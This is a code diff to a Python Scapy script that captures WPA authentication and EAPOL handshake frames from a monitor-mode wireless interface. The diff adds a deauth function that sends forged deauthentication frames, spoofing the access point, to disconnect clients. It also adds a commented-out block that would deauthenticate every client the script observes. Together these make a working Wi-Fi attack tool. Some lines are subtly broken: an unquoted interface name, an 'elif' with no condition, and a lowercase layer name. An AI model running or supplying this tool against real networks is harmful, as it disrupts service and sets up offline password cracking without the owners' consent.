@@ -4,9 +4,14 @@ import subprocess
 
 def parse_packets(packet, output):
     if packet.haslayer(Dot11Auth) or packet.haslayer(EAPOL):
-        print("Saving frame")
         wrpcap(output, packet, append=True)
-
+    '''
+    elif:
+        if packet.haslayer(Dot11):
+            cli_mac = packet[Dot11].addr2
+            bssid   = packet[Dot11].addr1
+            deauth(bssid, cli_mac)
+    '''
 def check_iface():
     proc = subprocess.Popen(["iw", "dev"], stdout=subprocess.PIPE)
     iw_results = proc.stdout.read()
@@ -20,6 +25,14 @@ def create_iface():
 
 def set_channel(channel):
     subprocess.run(["iwconfig", "wlan0mon", "channel", str(channel)])
+
+def deauth(ap_mac, client_mac):
+    Deauth_packet = RadioTap()\
+                    /Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)\
+                    /Dot11Deauth(reason=7)
+    for _ in range(10):
+        send(Deauth_packet, iface=wlan0mon, count=10, inter=0.1)
+
 
 def main(args):
     try:
@@ -37,4 +50,6 @@ def main(args):
     sniff(filter="", prn=lambda p: parse_packets(p, outpath), store=0, iface='wlan0mon')
 
 if __name__ == "__main__":
+    conf.layers.filter([dot11])
     main(sys.argv)
+    conf.layers.unfilter()
